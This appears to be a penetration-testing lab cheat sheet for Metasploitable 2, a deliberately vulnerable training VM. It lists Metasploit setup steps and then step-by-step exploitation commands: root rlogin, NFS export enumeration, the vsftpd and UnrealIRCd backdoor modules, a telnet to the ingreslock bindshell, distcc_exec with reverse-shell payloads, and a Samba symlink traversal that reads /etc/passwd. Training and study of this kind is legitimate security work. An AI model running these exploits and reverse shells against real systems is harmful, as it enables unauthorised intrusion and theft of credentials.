# Metasploitable 2

- Start postgresql
    ```
    service postgresql start
    ```

- Start postgresql on boot
    ```
    update-rc.d postgresql enable
    ```

- Start and stop metasploit
    ```
    service metasploit start
    msfconsole
    exit
    service metasploit stop
    ```

- Log everything to /root/msf_console.log
    ```
    echo "spool /root/msf_console.log" > /root/.msf4/msfconsole.rc


# Unix Basics

## Rlogin (512,513,514)
- TCP ports 512, 513, and 514 are known as “r” services, and have been misconfigured to allow remote access from any host
- For this vulnerability we need rsh-client
    ```
    rlogin -l root ip_address
    ```

## Network File System(2049)
- Lets use rpcinfo to identify NFS
    ```
    rpcinfo -p ip_address
    ```
-  To determine that the ”/” share (the root of the file system) is being exported
    ```
    showmount -e ip_address
    ```

## Backdoor
- **On port 21, Metasploitable2 runs vsftpd, a popular FTP server**
- For this vsftpd go to msfconsole of linux
    ```
    msfconsole
    ```
- After that use following exploit
    ```
    use exploit/unix/ftp/vsftpd_234_backdoor
    ```

    ![Screenshot](/images/vsftp.png)


- **On port 6667, Metasploitable2 runs the UnreaIRCD IRC daemon**
    - For this use following exploit
        ```
        msfconsole
        ```

        ```
        use exploit/unix/irc/unreal_ircd_3281_backdoor
        ```

        ```
        set RHOSTS target_ip
        ```

        ```
        set LHOST attacker_ip
        ```

        ```
        exploit
        ```

## Ingreslock(port 1524)
- It was a popular choice a decade ago for adding a backdoor to a compromised server
- Easy to access
    ```
    telnet target_ip 1524
    ```

## Unintentional backdoor
- distccd
- Run the following command
    ```
    msfconsole
    ```

    ```
    use exploit/unix/misc/distcc_exec
    ```

    ```
    set RHOSTS target_ip
    ```

    ```
    exploit
    ```

- By default this uses following 
    ```
    cmd/unix/reverse_bash
    ```

- Sometimes this payload doesn't work. So lets change this payload into another
    ```
    set payload cmd/unix/reverse_perl
    ```
- Now run exploit
    ```
    exploit
    ```


## Samba
- Samba, when configured with a writeable file share and enabled (default is on), can also be used as a backdoor of sorts to access files that were not meant to be shared
- Open terminal and paste following
    ```
    smbclient -L //target_ip
    ```
- They will ask password put kali linux password

- Now after this again open another terminal and open msfconsole and perform following activities
    ```
    use auxiliary/admin/smb/samba_symlink_traversal
    ```

    ```
    set RHOSTS target_ip
    ```

    ```
    set SMBSHARE tmp
    ```

    ```
    exploit
    ```

- Again go to new terminal and perform following activities
    ```
    smbclient //target_ip/tmp
    ```

    ```
    cd rootfs
    ```

    ```
    cd etc
    ```

    ```
    more passwd
    ```
    
